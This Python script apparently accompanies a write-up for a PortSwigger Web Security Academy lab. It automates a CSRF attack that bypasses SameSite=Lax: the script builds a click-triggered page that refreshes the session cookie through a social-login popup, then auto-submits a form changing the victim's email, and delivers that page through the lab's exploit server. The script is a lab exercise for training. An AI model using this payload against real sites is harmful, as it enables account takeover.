#!/usr/bin/env python3
"""
SameSite Lax bypass via cookie refresh
PortSwigger Web Security Academy -- Cross-Site Request Forgery (CSRF)

Companion script for the writeup: 10-samesite-lax-cookie-refresh.md

What this does:
    Chrome's default SameSite=Lax carries a two-minute grace period after a
    cookie is issued, during which top-level cross-site POSTs still carry it
    (a compatibility carve-out for SSO flows). A plain CSRF attempt normally
    lands outside that window, but /social-login reissues the session cookie
    on every completed OAuth round-trip -- even for an already-logged-in
    user -- which resets the clock. craft_samesite_lax_cookie_refresh() in
    CSRF.py builds a page that waits for a genuine click (popups triggered
    without one get blocked), opens /social-login in a popup on click, and
    five seconds later -- long enough for the OAuth round-trip to finish --
    submits the CSRF form, landing inside the freshly reopened Lax window.

Usage:
    python 10-samesite-lax-cookie-refresh.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def _get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def _exploit_server_deliver(exploit_url: str, body: str, headers: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": body,
            "responseHead": headers,
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def solve(lab_url: str) -> None:
    client = httpx.Client(
        base_url=lab_url, follow_redirects=True, timeout=20,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    client.get("/")

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found.")
        return

    html = (
        '<html><body>\n'
        f'<form method="POST" action="{lab_url}/my-account/change-email">\n'
        '  <input type="hidden" name="email" value="hacker@evil-user.net">\n'
        '</form>\n'
        '<script>\n'
        '  window.onclick = () => {\n'
        f'    window.open("{lab_url}/social-login");\n'
        '    setTimeout(() => {\n'
        '      document.forms[0].submit();\n'
        '    }, 5000);\n'
        '  }\n'
        '</script>\n'
        'Click anywhere on the page\n'
        '</body></html>'
    )
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    print("[*] Technique: SameSite default-Lax: cookie refresh -> 120s POST window")

    _exploit_server_deliver(exploit_url, html, headers)
    time.sleep(15)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- the CSRF POST landed inside the refreshed Lax grace window.")
    else:
        print("[-] Not solved yet -- the exploit server's simulated victim has to click the page for the popup to fire.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
